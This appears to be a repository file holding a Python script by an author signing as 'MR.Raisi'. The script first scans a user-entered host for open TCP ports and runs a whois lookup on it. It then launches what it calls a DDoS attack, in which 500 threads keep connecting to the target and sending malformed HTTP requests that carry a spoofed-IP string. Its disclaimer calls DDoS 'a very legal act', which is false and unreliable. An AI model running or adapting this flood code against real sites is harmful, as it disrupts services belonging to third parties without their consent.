# portscan0
portscanner

###===========+++ portscan  script to scan open ports of sites+++============###


###===================++++Import required libraries++++======================###
import sys 

import os

import subprocess as ps

import whois

from  queue import  Queue

import socket 

import threading

import cowsay

import os

from datetime import datetime

from pyfiglet import  Figlet

from colorama import init, AnsiToWin32, Fore, Back 

init(wrap=False) 
stream = AnsiToWin32(sys.stderr).stream
tem =ps.call("cls"  ,  shell=True)#For Windows, use the word "cls" instead of "clear"#
print(Fore.BLUE,"",file=stream)
cowsay.daemon("portscanner")
print(Fore.YELLOW,"",file=stream)
Text= Figlet(font="slant") 
print(Text.renderText("portscanner"))   
print(Fore.MAGENTA, " ||========== HELLO BEAUTIFUL  WORLD ======= I LOVE YOU PYTHON!========||", file=stream)
print()
print(Fore.GREEN ,"||======  MR.Raisi ======||",file=stream)
print()
print(Fore.CYAN,"||--------  IRAN  --------||",file=stream)
print()
print(Fore.YELLOW,"||-----===  Sistan and  Baluchestan_Chabahar  ===------||",file=stream)
print()
print(Fore.RED,"||------------   0915375565  --------||",file= stream)
print()
print( Fore.YELLOW,"*"*60,file=stream)
print()
remoteserver = input( "|======  Enter Your HostName or IpAdress: ")
print()
print(Fore.YELLOW,"*"*60,file=stream)

target = socket.gethostbyname(remoteserver)

url=whois.whois(target)

queue=Queue()

open_ports =[]

Time1 = datetime.now()

print(Fore.BLUE,"_"*65 ,file=stream)
print()
print(Fore.GREEN,"Please wait while the script is scanning the host:",target,file=stream)
print()
print(Fore.BLUE,"_"*65,file=stream)

def portscan(port):
    try:
        sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((target,port))
        return True
    except:
        return False
def get_ports(mode):
    if mode == 1:
        for port in range(1,1024):
            queue.put(port)
    elif mode == 2:
        for port in range(1,49154):
            queue.put(port)
    elif mode == 3:
        ports = [20,21,22,23,25,53,80,110,443]
        for port in ports:
            queue.put(port)
    elif mode == 4:
        ports=input(Fore.RED,"Enter  your ports(seperate by blank):", file=stream)
        ports = ports.split()
        ports = list(map(int,ports))
        for port in ports:
            queue.put(port)
def processor():
    while not queue.empty():
        port =queue.get()
        if portscan(port):
            print(Fore.YELLOW, "Port  {} is open!!".format(port), file=stream)
            open_ports.append(port)
       # else:##You can disable or delete this section##
           # print(Fore.RED ,"Port  {} is closed!!".format(port), file=stream)
def run_scanner(threads,mode):
    get_ports(mode)
    thread_list=[]
    for t in range(threads):
        thread = threading.Thread(target=processor)
        thread_list.append(thread)
    for thread in thread_list:
        thread.start()
    for thread in thread_list:
        thread.join()

    print(Fore.GREEN,"Open ports are:======>>",open_ports, file=stream)
run_scanner(100,1)

Time2=datetime.now()
Total=Time2-Time1
print("="*65)
print(Fore.MAGENTA ,"scanning fnish in:======>>:",Total,file=stream)
print("="*65)
print(Fore.BLUE,url.text,file=stream)
#print(Fore.RED,"_"*65, file=stream)
print(Fore.BLUE,"Good luck and have a great day, dear friend, goodbye!!",file=stream)
print(Fore.BLUE,"_"*65,file=stream)


##This is the code for the DDos attack##

''' Attackin DDos on site severs is a very legal act
all over the word !! This script is writen only for
learning and practicing scripting with paython!!Iam not
responsible for doing very legal work with this script,
it is better to test it on your own host and sever.
@ Thank YOU!

      MR.Raisi

'''
print(Fore.RED,"*"*120,file=stream)
print()
print(Fore.WHITE,"This part of the script is for DDos attack,Are you sure you want to continue? If yes, then Enter the requested information!",file=stream)
print(Fore.GREEN,"",file=stream)
cowsay.daemon("AttackDDos")
print(Fore.RED,"",file=stream)
print(Text.renderText("AttackDDos"))
print()
print("||===== A dangerous DDos attack is a very legal act! ====||")
print()
feke_ip=input("Enter your Feke_IP:")
print()
port=int(input("Enter your Port:"))

already_connected = 0

def attack():
    while True:

    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" +target+ "HTTP /1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("HTTP /" +feke_ip+ "\r\n\r\n").encode("ascii"),(target,port))
        s.close()

        global already_connected
        already_connected +=1
        if already_connected % 500 ==0:
            print(Fore.YELLOW,already_connected,file=stream)
    


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


print(Fore.GREEN,"The DDos attack is over!",Total,file=stream)
#print(Fore.RED,"The attack was successful!!",file=stream)
print(Fore.BLUE,"Good luck and have a great day, dear friend, goodbye!! ",file=stream)
print(Fore.BLUE,"_"*60,file=stream)

